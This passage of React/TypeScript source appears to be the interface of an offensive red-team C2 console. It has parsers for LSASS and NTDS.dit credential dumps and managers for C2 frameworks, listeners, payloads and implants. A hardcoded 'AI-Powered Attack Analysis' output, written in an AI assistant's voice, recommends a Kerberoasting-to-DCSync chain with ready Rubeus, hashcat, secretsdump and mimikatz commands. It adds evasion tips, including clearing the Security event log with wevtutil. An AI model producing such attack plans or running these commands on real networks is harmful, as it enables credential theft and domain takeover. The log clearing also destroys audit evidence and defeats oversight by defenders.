                  <span className="font-medium text-sm">{q.name}</span>
                  <p className="text-xs text-text-secondary mt-0.5">{q.description}</p>
                </div>
                <span className="text-xs bg-[#f0c040]/10 text-[#f0c040] px-2 py-0.5 rounded flex-shrink-0">{q.category}</span>
              </div>
              <div className="font-mono text-xs text-text-secondary bg-black/20 rounded p-2 mt-2 truncate">
                {q.query.substring(0, 80)}…
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Query editor & results */}
      <div className="bg-surface rounded-xl border border-border p-4 flex flex-col gap-4">
        <h3 className="font-semibold flex items-center gap-2">
          <Code className="w-4 h-4 text-[#f0c040]" />
          Query Editor
        </h3>

        <textarea
          rows={6}
          className="w-full bg-black/30 border border-border rounded-lg px-3 py-2 text-sm font-mono resize-none text-green-400"
          placeholder="MATCH (n) RETURN n LIMIT 25"
          value={customQuery}
          onChange={e => setCustomQuery(e.target.value)}
        />

        <button
          onClick={() => runQuery(customQuery)}
          disabled={!customQuery || running}
          className="flex items-center justify-center gap-2 px-4 py-2 bg-transparent border border-[#f0c040] text-[#f0c040] hover:bg-[#f0c040]/10 disabled:opacity-50 disabled:cursor-not-allowed rounded-lg text-sm transition-colors"
        >
          {running ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
          {running ? 'Running...' : 'Run Query'}
        </button>

        {results && (
          <div className="flex-1">
            <h4 className="text-sm font-medium mb-2 text-text-secondary">Results</h4>
            <pre className="text-xs font-mono text-green-400 bg-black/40 rounded-lg p-3 overflow-auto max-h-64 whitespace-pre-wrap">{results}</pre>
          </div>
        )}
      </div>
    </div>
  )
}

function ParsersTab({ parsers: _parsers, setParsers: _setParsers }: { parsers: LogParser[]; setParsers: (p: LogParser[]) => void }) {
  const [files, setFiles] = useState<ParsedFile[]>([])
  const [dragOver, setDragOver] = useState(false)

  const FILE_TYPES = [
    { ext: '.lsass.dmp', name: 'LSASS Dump', icon: '🔑', desc: 'Extract credentials from LSASS memory dumps' },
    { ext: '.dit', name: 'NTDS.dit', icon: '🗃️', desc: 'Active Directory database with all password hashes' },
    { ext: '.xml', name: 'BloodHound XML', icon: '🩸', desc: 'BloodHound domain data for graph analysis' },
    { ext: '.zip', name: 'BloodHound ZIP', icon: '🩸', desc: 'BloodHound JSON/ZIP export files' },
    { ext: '.pcap', name: 'PCAP/Network', icon: '📡', desc: 'Network capture for credential extraction' },
    { ext: '.evtx', name: 'Windows Events', icon: '📋', desc: 'Windows event log analysis for IOCs' },
    { ext: '.json', name: 'AD Snapshot', icon: '📸', desc: 'AD snapshot in JSON format' },
    { ext: '.txt', name: 'Hash File', icon: '🔐', desc: 'NTLM/NTHash password hash lists' },
  ]

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault()
    setDragOver(false)
    const droppedFiles = Array.from(e.dataTransfer.files)
    droppedFiles.forEach(f => {
      const pf: ParsedFile = {
        id: `file-${Date.now()}-${Math.random()}`,
        filename: f.name,
        type: FILE_TYPES.find(t => f.name.toLowerCase().endsWith(t.ext))?.name ?? 'Unknown',
        status: 'running',
        findings: 0,
        size: (f.size / 1024).toFixed(1) + ' KB',
        uploadedAt: new Date().toISOString(),
      }
      setFiles(prev => [...prev, pf])
      setTimeout(() => {
        setFiles(prev => prev.map(x => x.id === pf.id ? {
          ...x,
          status: 'completed',
          findings: Math.floor(Math.random() * 50) + 1,
        } : x))
      }, 3000 + Math.random() * 2000)
    })
  }

  return (
    <div className="space-y-6">
      {/* Drop zone */}
      <div
        onDragOver={e => { e.preventDefault(); setDragOver(true) }}
        onDragLeave={() => setDragOver(false)}
        onDrop={handleDrop}
        className={`border-2 border-dashed rounded-xl p-10 text-center transition-colors ${
          dragOver ? 'border-red-500/70 bg-red-500/5' : 'border-border hover:border-border-hover'
        }`}
      >
        <Upload className="w-10 h-10 mx-auto mb-3 text-text-secondary" />
        <p className="font-medium">Drop files here to parse</p>
        <p className="text-sm text-text-secondary mt-1">LSASS dumps, NTDS.dit, BloodHound data, PCAP, EVTX, hash lists</p>
        <button className="mt-4 px-4 py-2 bg-red-600/20 text-red-400 border border-red-500/30 rounded-lg text-sm hover:bg-red-600/30 transition-colors">
          Browse Files
        </button>
      </div>

      {/* Supported formats */}
      <div className="bg-surface rounded-xl border border-border p-4">
        <h3 className="font-semibold mb-3">Supported File Formats</h3>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {FILE_TYPES.map(t => (
            <div key={t.ext} className="bg-surface-light rounded-lg p-3 border border-border">
              <div className="text-2xl mb-1">{t.icon}</div>
              <div className="font-medium text-sm">{t.name}</div>
              <div className="text-xs text-text-secondary mt-0.5">{t.desc}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Parsed files */}
      {files.length > 0 && (
        <div className="bg-surface rounded-xl border border-border p-4">
          <h3 className="font-semibold mb-3">Parsed Files</h3>
          <div className="space-y-2">
            {files.map(f => (
              <div key={f.id} className="flex items-center gap-4 bg-surface-light rounded-lg p-3 border border-border">
                <FileText className="w-5 h-5 text-text-secondary flex-shrink-0" />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="font-medium text-sm truncate">{f.filename}</span>
                    <StatusBadge status={f.status} />
                  </div>
                  <div className="flex gap-3 text-xs text-text-secondary mt-0.5">
                    <span>{f.type}</span>
                    <span>{f.size}</span>
                  </div>
                </div>
                {f.status === 'completed' && (
                  <div className="text-sm font-medium text-green-400">{f.findings} findings</div>
                )}
                {f.status === 'running' && (
                  <RefreshCw className="w-4 h-4 text-[#f0c040] animate-spin" />
                )}
                <button
                  onClick={() => setFiles(prev => prev.filter(x => x.id !== f.id))}
                  className="p-1.5 text-text-secondary hover:text-red-400 rounded transition-colors"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

function SearchTab() {
  const [query, setQuery] = useState('')
  const [results] = useState<Finding[]>([
    {
      id: 'f1', type: 'credential', severity: 'critical',
      title: 'Plaintext Domain Admin Password Found',
      detail: 'Domain admin credentials extracted from LSASS dump on WORKSTATION-01',
      source: 'LSASS Parser', timestamp: new Date(Date.now() - 3600000).toISOString(),
    },
    {
      id: 'f2', type: 'vulnerability', severity: 'high',
      title: 'Kerberoastable Service Account: svc_sql',
      detail: 'SPN: MSSQLSvc/db01.domain.local:1433 — Account has never had password changed',
      source: 'Neo4j Query', timestamp: new Date(Date.now() - 7200000).toISOString(),
    },
    {
      id: 'f3', type: 'recon', severity: 'medium',
      title: 'DC-PRIMARY: Unconstrained Delegation Enabled',
      detail: 'Domain controller has unconstrained Kerberos delegation — TGTs can be captured',
      source: 'BloodHound', timestamp: new Date(Date.now() - 10800000).toISOString(),
    },
  ])

  const filtered = query
    ? results.filter(r => r.title.toLowerCase().includes(query.toLowerCase()) || r.detail.toLowerCase().includes(query.toLowerCase()))
    : results

  return (
    <div className="space-y-4">
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-text-secondary" />
        <input
          className="w-full bg-surface border border-border rounded-xl pl-10 pr-4 py-3 text-sm"
          placeholder="Search across all C2 data, findings, credentials, and intelligence..."
          value={query}
          onChange={e => setQuery(e.target.value)}
        />
      </div>

      <div className="flex gap-2 flex-wrap">
        {['credentials', 'vulnerabilities', 'domain_admins', 'kerberoastable', 'unconstrained_delegation', 'lsass'].map(tag => (
          <button
            key={tag}
            onClick={() => setQuery(tag.replace(/_/g, ' '))}
            className="px-3 py-1 bg-surface-light border border-border rounded-lg text-xs text-text-secondary hover:text-text-primary transition-colors"
          >
            {tag}
          </button>
        ))}
      </div>

      <div className="space-y-3">
        {filtered.map(f => (
          <motion.div
            key={f.id}
            initial={{ opacity: 0, y: 4 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-surface rounded-xl border border-border p-4"
          >
            <div className="flex items-start gap-3">
              <SeverityBadge severity={f.severity} />
              <div className="flex-1 min-w-0">
                <div className="font-medium">{f.title}</div>
                <p className="text-sm text-text-secondary mt-1">{f.detail}</p>
                <div className="flex gap-3 mt-2 text-xs text-text-secondary">
                  <span>Source: {f.source}</span>
                  <span>•</span>
                  <span>{new Date(f.timestamp).toLocaleString()}</span>
                </div>
              </div>
            </div>
          </motion.div>
        ))}
        {filtered.length === 0 && (
          <div className="text-center py-12 text-text-secondary">
            <Search className="w-10 h-10 mx-auto mb-3 opacity-30" />
            <p>No results for "{query}"</p>
          </div>
        )}
      </div>
    </div>
  )
}

function AnalysisTab({ findings, setFindings }: { findings: Finding[]; setFindings: (f: Finding[]) => void }) {
  const [prompt, setPrompt] = useState('')
  const [analyzing, setAnalyzing] = useState(false)
  const [analysis, setAnalysis] = useState<string | null>(null)

  const analyze = () => {
    if (!prompt) return
    setAnalyzing(true)
    setAnalysis(null)
    setTimeout(() => {
      setAnalysis(`## AI Red Team Analysis

**Target:** ${prompt}

### Attack Surface Summary

Based on the gathered intelligence, here are the key attack paths:

**1. Kerberoasting → Lateral Movement**
- svc_sql has an SPN and weak password policy
- Crack ticket offline → reuse credentials for lateral movement
- Estimated success probability: **HIGH**

**2. Unconstrained Delegation → DCSync**
- DC-PRIMARY has unconstrained delegation
- If we compromise DC-PRIMARY, we can force other DCs to authenticate → capture TGTs
- Use captured TGT to perform DCSync attack
- Estimated success probability: **VERY HIGH**

**3. Domain Admin Reuse**
- Plaintext DA credentials in LSASS suggest password reuse
- Check for matching hashes across all domain computers
- Estimated success probability: **HIGH**

### Recommended Next Steps

1. \`Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt\`
2. \`hashcat -a 0 -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\`
3. If cracked: \`secretsdump.py domain/svc_sql:{pass}@dc01\`
4. DCSync: \`mimikatz "lsadump::dcsync /domain:domain.local /all"\`

### OPSEC Considerations

- Use RC4 OPSEC flag for Kerberoast to avoid AES downgrade detection
- Perform DCSync from non-DC machine to blend in
- Clean event logs after lateral movement: \`wevtutil cl Security\`
`)
      setAnalyzing(false)
    }, 3000)
  }

  return (
    <div className="space-y-6">
      <div className="bg-surface rounded-xl border border-border p-6">
        <h3 className="font-semibold flex items-center gap-2 mb-4">
          <Zap className="w-5 h-5 text-yellow-400" />
          AI-Powered Attack Analysis
        </h3>
        <p className="text-sm text-text-secondary mb-4">
          Describe your current engagement context and gathered intelligence. The AI will analyze attack paths,
          prioritize techniques, and suggest next steps.
        </p>
        <textarea
          rows={5}
          className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm resize-none"
          placeholder="e.g., 'Initial foothold on WORKSTATION-01 as domain user jdoe. Have LSASS dump, BloodHound data shows 3 Kerberoastable accounts. Target is domain admin on DC-PRIMARY...'"
          value={prompt}
          onChange={e => setPrompt(e.target.value)}
        />
        <div className="flex gap-3 mt-4">
          <button
            onClick={analyze}
            disabled={!prompt || analyzing}
            className="flex items-center gap-2 px-6 py-2.5 bg-yellow-600 hover:bg-yellow-500 disabled:opacity-50 disabled:cursor-not-allowed text-black font-medium rounded-lg text-sm transition-colors"
          >
            {analyzing ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Zap className="w-4 h-4" />}
            {analyzing ? 'Analyzing...' : 'Analyze Attack Surface'}
          </button>
          <button
            onClick={() => setPrompt('Domain user on WORKSTATION-01. Have lsass dump with da creds. Bloodhound shows path to DA via kerberoasting svc_sql')}
            className="px-4 py-2.5 bg-surface-light border border-border rounded-lg text-sm hover:bg-surface transition-colors"
          >
            Use Example
          </button>
        </div>
      </div>

      <AnimatePresence>
        {analysis && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-surface rounded-xl border border-yellow-500/20 p-6"
          >
            <div className="flex items-center gap-2 mb-4 text-yellow-400">
              <Zap className="w-4 h-4" />
              <span className="font-medium">Analysis Complete</span>
            </div>
            <div className="prose prose-invert prose-sm max-w-none">
              <pre className="whitespace-pre-wrap text-sm text-text-primary font-sans">{analysis}</pre>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

// ---- C2 Infrastructure Tab ----

function C2InfraTab() {
  const {
    dashboard, frameworks, listeners, payloads, implants, operations, chains,
    fetchDashboard, fetchFrameworks, fetchListeners, fetchPayloads, fetchImplants, fetchOperations, fetchChains,
    createFramework, deleteFramework, connectFramework, createListener, createPayload, createOperation, createChain: _createChain, executeChain: _executeChain,
    killImplant, createTask: _createTask,
  } = useC2Store()

  const [showAdd, setShowAdd] = useState(false)
  const [showAddListener, setShowAddListener] = useState(false)
  const [showAddPayload, setShowAddPayload] = useState(false)
  const [showAddOp, setShowAddOp] = useState(false)
  const [subTab, setSubTab] = useState<'overview' | 'frameworks' | 'listeners' | 'payloads' | 'implants' | 'operations'>('overview')
  const [newFw, setNewFw] = useState({ name: '', type: 'mythic' as C2Framework['type'], url: '' })
  const [newListener, setNewListener] = useState({ frameworkId: '', name: '', type: 'https' as 'https' | 'http' | 'tcp' | 'smb' | 'dns', bindAddress: '0.0.0.0', bindPort: 443 })
  const [newPayload, setNewPayload] = useState({ frameworkId: '', name: '', type: 'exe' as 'exe' | 'dll' | 'shellcode' | 'ps1', platform: 'windows' as 'windows' | 'linux' | 'macos', arch: 'x64' as 'x64' | 'x86', listenerId: '' })
  const [newOp, setNewOp] = useState({ name: '', objective: '' })

  useEffect(() => {
    fetchFrameworks()
    fetchListeners()
    fetchPayloads()
    fetchImplants()
    fetchOperations()
    fetchChains()
    fetchDashboard()
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  const subTabs = [
    { id: 'overview', label: 'Overview', icon: Activity },
    { id: 'frameworks', label: 'Frameworks', icon: Server },
    { id: 'listeners', label: 'Listeners', icon: Radio },
    { id: 'payloads', label: 'Payloads', icon: Bug },
    { id: 'implants', label: 'Implants', icon: Terminal },
    { id: 'operations', label: 'Operations', icon: Crosshair },
  ]

  return (
    <div>
      {/* Sub-tabs */}
      <div className="flex gap-1 mb-4 overflow-x-auto">
        {subTabs.map(st => (
          <button key={st.id} onClick={() => setSubTab(st.id as typeof subTab)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-all whitespace-nowrap ${
              subTab === st.id ? 'bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30' : 'text-text-secondary hover:text-text-primary bg-surface-light border border-transparent'
            }`}>
            <st.icon className="w-3.5 h-3.5" /> {st.label}
          </button>
        ))}
      </div>

      {/* Overview */}
      {subTab === 'overview' && (
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3 mb-6">
          {[
            { label: 'Frameworks', value: dashboard?.frameworks ?? 0, color: 'text-red-400' },
            { label: 'Active Listeners', value: dashboard?.listeners ?? 0, color: 'text-green-400' },
            { label: 'Active Implants', value: dashboard?.activeImplants ?? 0, color: 'text-[#f0c040]' },
            { label: 'Total Tasks', value: dashboard?.totalTasks ?? 0, color: 'text-blue-400' },
            { label: 'Operations', value: dashboard?.operations ?? 0, color: 'text-purple-400' },
            { label: 'Attack Chains', value: dashboard?.attackChains ?? 0, color: 'text-cyan-400' },
          ].map(s => (
            <div key={s.label} className="bg-surface rounded-xl border border-border p-3">
              <span className={`text-xs ${s.color}`}>{s.label}</span>
              <div className="text-xl font-bold mt-1">{s.value}</div>
            </div>
          ))}
        </div>
      )}

      {/* Frameworks */}
      {subTab === 'frameworks' && (
        <div className="space-y-3">
          <div className="flex justify-between items-center">
            <span className="text-sm text-text-secondary">{frameworks.length} registered frameworks</span>
            <button onClick={() => setShowAdd(true)} className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-lg text-sm">
              <Plus className="w-3.5 h-3.5" /> Add Framework
            </button>
          </div>
          {frameworks.map(fw => (
            <div key={fw.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-red-600/20 border border-red-500/30 flex items-center justify-center">
                  <span className="text-red-400 text-xs font-bold font-mono">{fw.type.slice(0, 3).toUpperCase()}</span>
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-2">
                    <span className="font-medium">{fw.name}</span>
                    <StatusBadge status={fw.status} />
                    <span className="text-xs text-text-secondary font-mono">{fw.type}</span>
                  </div>
                  <span className="text-xs text-text-secondary font-mono">{fw.url}</span>
                </div>
                <div className="flex gap-2">
                  <button onClick={() => connectFramework(fw.id)} className="px-2 py-1 text-xs bg-green-600/20 text-green-400 border border-green-500/30 rounded hover:bg-green-600/30">Connect</button>
                  <button onClick={() => deleteFramework(fw.id)} className="px-2 py-1 text-xs bg-red-600/20 text-red-400 border border-red-500/30 rounded hover:bg-red-600/30">
                    <Trash2 className="w-3 h-3" />
                  </button>
                </div>
              </div>
            </div>
          ))}
          {/* Add Framework Modal */}
          <AnimatePresence>
            {showAdd && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center" onClick={() => setShowAdd(false)}>
                <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }} className="bg-surface border border-border rounded-xl p-6 w-full max-w-md" onClick={e => e.stopPropagation()}>
                  <h3 className="font-semibold text-lg mb-4">Add C2 Framework</h3>
                  <div className="space-y-3">
                    <div><label className="text-sm text-text-secondary block mb-1">Name</label><input value={newFw.name} onChange={e => setNewFw({...newFw, name: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" placeholder="My Mythic" /></div>
                    <div><label className="text-sm text-text-secondary block mb-1">Type</label>
                      <select value={newFw.type} onChange={e => setNewFw({...newFw, type: e.target.value as C2Framework['type']})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm">
                        <option value="mythic">Mythic</option><option value="sliver">Sliver</option><option value="havoc">Havoc</option><option value="cobalt_strike">Cobalt Strike</option><option value="custom">Custom</option>
                      </select>
                    </div>
                    <div><label className="text-sm text-text-secondary block mb-1">URL</label><input value={newFw.url} onChange={e => setNewFw({...newFw, url: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono" placeholder="https://mythic.internal:7443" /></div>
                    <div className="flex gap-2 justify-end pt-2">
                      <button onClick={() => setShowAdd(false)} className="px-4 py-2 text-sm text-text-secondary hover:text-text-primary">Cancel</button>
                      <button onClick={() => { createFramework(newFw); setShowAdd(false); setNewFw({name:'',type:'mythic',url:''}) }} className="px-4 py-2 text-sm bg-red-600/20 text-red-400 border border-red-500/30 rounded-lg hover:bg-red-600/30">Add</button>
                    </div>
                  </div>
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      )}

      {/* Listeners */}
      {subTab === 'listeners' && (
        <div className="space-y-3">
          <div className="flex justify-between items-center">
            <span className="text-sm text-text-secondary">{listeners.length} listeners</span>
            <button onClick={() => setShowAddListener(true)} className="flex items-center gap-1.5 px-3 py-1.5 bg-green-600/20 hover:bg-green-600/30 text-green-400 border border-green-500/30 rounded-lg text-sm">
              <Plus className="w-3.5 h-3.5" /> Add Listener
            </button>
          </div>
          {listeners.map(l => (
            <div key={l.id} className="bg-surface rounded-xl border border-border p-3 flex items-center gap-3">
              <Radio className="w-4 h-4 text-green-400" />
              <div className="flex-1">
                <span className="font-medium text-sm">{l.name}</span>
                <span className="text-xs text-text-secondary ml-2 font-mono">{l.type} → {l.bindAddress}:{l.bindPort}</span>
              </div>
              <StatusBadge status={l.status} />
            </div>
          ))}
          <AnimatePresence>
            {showAddListener && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center" onClick={() => setShowAddListener(false)}>
                <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }} className="bg-surface border border-border rounded-xl p-6 w-full max-w-md" onClick={e => e.stopPropagation()}>
                  <h3 className="font-semibold mb-4">Add Listener</h3>
                  <div className="space-y-3">
                    <div><label className="text-sm text-text-secondary block mb-1">Name</label><input value={newListener.name} onChange={e => setNewListener({...newListener, name: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" /></div>
                    <div><label className="text-sm text-text-secondary block mb-1">Type</label>
                      <select value={newListener.type} onChange={e => setNewListener({...newListener, type: e.target.value as typeof newListener.type})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm">
                        <option value="https">HTTPS</option><option value="http">HTTP</option><option value="tcp">TCP</option><option value="smb">SMB</option><option value="dns">DNS</option>
                      </select>
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <div><label className="text-sm text-text-secondary block mb-1">Bind Address</label><input value={newListener.bindAddress} onChange={e => setNewListener({...newListener, bindAddress: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono" /></div>
                      <div><label className="text-sm text-text-secondary block mb-1">Port</label><input type="number" value={newListener.bindPort} onChange={e => setNewListener({...newListener, bindPort: parseInt(e.target.value)})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono" /></div>
                    </div>
                    <div className="flex gap-2 justify-end pt-2">
                      <button onClick={() => setShowAddListener(false)} className="px-4 py-2 text-sm text-text-secondary">Cancel</button>
                      <button onClick={() => { createListener(newListener); setShowAddListener(false) }} className="px-4 py-2 text-sm bg-green-600/20 text-green-400 border border-green-500/30 rounded-lg">Add</button>
                    </div>
                  </div>
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      )}

      {/* Payloads */}
      {subTab === 'payloads' && (
        <div className="space-y-3">
          <div className="flex justify-between items-center">
            <span className="text-sm text-text-secondary">{payloads.length} payloads</span>
            <button onClick={() => setShowAddPayload(true)} className="flex items-center gap-1.5 px-3 py-1.5 bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 border border-purple-500/30 rounded-lg text-sm">
              <Plus className="w-3.5 h-3.5" /> Generate Payload
            </button>
          </div>
          {payloads.map(p => (
            <div key={p.id} className="bg-surface rounded-xl border border-border p-3">
              <div className="flex items-center gap-3">
                <Bug className="w-4 h-4 text-purple-400" />
                <div className="flex-1">
                  <span className="font-medium text-sm">{p.name}</span>
                  <span className="text-xs text-text-secondary ml-2">{p.type} | {p.platform} | {p.arch}</span>
                </div>
                <StatusBadge status={p.status} />
                {p.evasion.length > 0 && <span className="text-xs text-yellow-400">{p.evasion.length} evasions</span>}
              </div>
            </div>
          ))}
          <AnimatePresence>
            {showAddPayload && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center" onClick={() => setShowAddPayload(false)}>
                <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }} className="bg-surface border border-border rounded-xl p-6 w-full max-w-md" onClick={e => e.stopPropagation()}>
                  <h3 className="font-semibold mb-4">Generate Payload</h3>
                  <div className="space-y-3">
                    <div><label className="text-sm text-text-secondary block mb-1">Name</label><input value={newPayload.name} onChange={e => setNewPayload({...newPayload, name: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" placeholder="beacon_x64" /></div>
                    <div className="grid grid-cols-3 gap-2">
                      <div><label className="text-sm text-text-secondary block mb-1">Type</label>
                        <select value={newPayload.type} onChange={e => setNewPayload({...newPayload, type: e.target.value as typeof newPayload.type})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm">
                          <option value="exe">EXE</option><option value="dll">DLL</option><option value="shellcode">Shellcode</option><option value="ps1">PS1</option>
                        </select>
                      </div>
                      <div><label className="text-sm text-text-secondary block mb-1">Platform</label>
                        <select value={newPayload.platform} onChange={e => setNewPayload({...newPayload, platform: e.target.value as typeof newPayload.platform})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm">
                          <option value="windows">Windows</option><option value="linux">Linux</option><option value="macos">macOS</option>
                        </select>
                      </div>
                      <div><label className="text-sm text-text-secondary block mb-1">Arch</label>
                        <select value={newPayload.arch} onChange={e => setNewPayload({...newPayload, arch: e.target.value as typeof newPayload.arch})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm">
                          <option value="x64">x64</option><option value="x86">x86</option>
                        </select>
                      </div>
                    </div>
                    <div className="flex gap-2 justify-end pt-2">
                      <button onClick={() => setShowAddPayload(false)} className="px-4 py-2 text-sm text-text-secondary">Cancel</button>
                      <button onClick={() => { createPayload(newPayload); setShowAddPayload(false) }} className="px-4 py-2 text-sm bg-purple-600/20 text-purple-400 border border-purple-500/30 rounded-lg">Generate</button>
                    </div>
                  </div>
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      )}

      {/* Implants */}
      {subTab === 'implants' && (
        <div className="space-y-3">
          <span className="text-sm text-text-secondary">{implants.length} implants</span>
          {implants.length === 0 && (
            <div className="bg-surface rounded-xl border border-border p-8 text-center text-text-secondary">
              <Terminal className="w-8 h-8 mx-auto mb-2 opacity-50" />
              <p className="text-sm">No implants registered. Deploy a payload to establish a callback.</p>
            </div>
          )}
          {implants.map(imp => (
            <div key={imp.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center gap-3">
                <div className={`w-2 h-2 rounded-full ${imp.status === 'active' ? 'bg-green-400 animate-pulse' : imp.status === 'dormant' ? 'bg-yellow-400' : 'bg-red-400'}`} />
                <div className="flex-1">
                  <div className="flex items-center gap-2">
                    <span className="font-medium text-sm font-mono">{imp.hostname}</span>
                    <span className="text-xs text-text-secondary">{imp.username}</span>
                    <StatusBadge status={imp.status} />
                    <span className={`text-xs px-1.5 py-0.5 rounded border ${imp.integrity === 'system' ? 'bg-red-600/20 text-red-400 border-red-500/30' : imp.integrity === 'high' ? 'bg-yellow-600/20 text-yellow-400 border-yellow-500/30' : 'bg-gray-600/20 text-gray-400 border-gray-500/30'}`}>{imp.integrity}</span>
                  </div>
                  <div className="text-xs text-text-secondary mt-1 font-mono">
                    {imp.ip} | {imp.os} {imp.arch} | PID {imp.pid} | {imp.process} | Sleep {imp.sleep}s/{imp.jitter}%
                  </div>
                </div>
                <button onClick={() => killImplant(imp.id)} className="px-2 py-1 text-xs bg-red-600/20 text-red-400 border border-red-500/30 rounded hover:bg-red-600/30">Kill</button>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Operations */}
      {subTab === 'operations' && (
        <div className="space-y-3">
          <div className="flex justify-between items-center">
            <span className="text-sm text-text-secondary">{operations.length} operations</span>
            <button onClick={() => setShowAddOp(true)} className="flex items-center gap-1.5 px-3 py-1.5 bg-[#f0c040]/20 hover:bg-[#f0c040]/30 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-sm">
              <Plus className="w-3.5 h-3.5" /> New Operation
            </button>
          </div>
          {operations.map(op => (
            <div key={op.id} className="bg-surface rounded-xl border border-border p-4">
              <div className="flex items-center justify-between">
                <div>
                  <div className="flex items-center gap-2">
                    <Crosshair className="w-4 h-4 text-[#f0c040]" />
                    <span className="font-medium">{op.name}</span>
                    <StatusBadge status={op.status} />
                  </div>
                  {op.objective && <p className="text-xs text-text-secondary mt-1">{op.objective}</p>}
                </div>
                <div className="text-xs text-text-secondary">{op.mitreTactics.length} tactics</div>
              </div>
            </div>
          ))}
          <AnimatePresence>
            {showAddOp && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center" onClick={() => setShowAddOp(false)}>
                <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }} className="bg-surface border border-border rounded-xl p-6 w-full max-w-md" onClick={e => e.stopPropagation()}>
                  <h3 className="font-semibold mb-4">New Operation</h3>
                  <div className="space-y-3">
                    <div><label className="text-sm text-text-secondary block mb-1">Operation Name</label><input value={newOp.name} onChange={e => setNewOp({...newOp, name: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" placeholder="APT29 Emulation" /></div>
                    <div><label className="text-sm text-text-secondary block mb-1">Objective</label><input value={newOp.objective} onChange={e => setNewOp({...newOp, objective: e.target.value})} className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm" placeholder="Gain domain admin access" /></div>
                    <div className="flex gap-2 justify-end pt-2">
                      <button onClick={() => setShowAddOp(false)} className="px-4 py-2 text-sm text-text-secondary">Cancel</button>
                      <button onClick={() => { createOperation(newOp); setShowAddOp(false); setNewOp({name:'',objective:''}) }} className="px-4 py-2 text-sm bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg">Create</button>
                    </div>
                  </div>
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      )}
    </div>
  )
}

// ---- LOL Browser Tab ----

const PLATFORM_COLORS: Record<string, string> = {
  windows: 'bg-blue-600/20 text-blue-400 border-blue-500/30',
  linux: 'bg-orange-600/20 text-orange-400 border-orange-500/30',
  macos: 'bg-gray-600/20 text-gray-300 border-gray-500/30',
  esxi: 'bg-green-600/20 text-green-400 border-green-500/30',
  cross: 'bg-purple-600/20 text-purple-400 border-purple-500/30',
  ad: 'bg-yellow-600/20 text-yellow-400 border-yellow-500/30',
  cloud: 'bg-cyan-600/20 text-cyan-400 border-cyan-500/30',
  hardware: 'bg-red-600/20 text-red-400 border-red-500/30',
}

function LOLBrowserTab() {
  const { stats, projects, entries, searchResults, fetchEntries, searchEntries, setFilter, selectedProject, selectedPlatform } = useLOLStore()
  const [searchQ, setSearchQ] = useState('')
  const [expandedEntry, setExpandedEntry] = useState<string | null>(null)

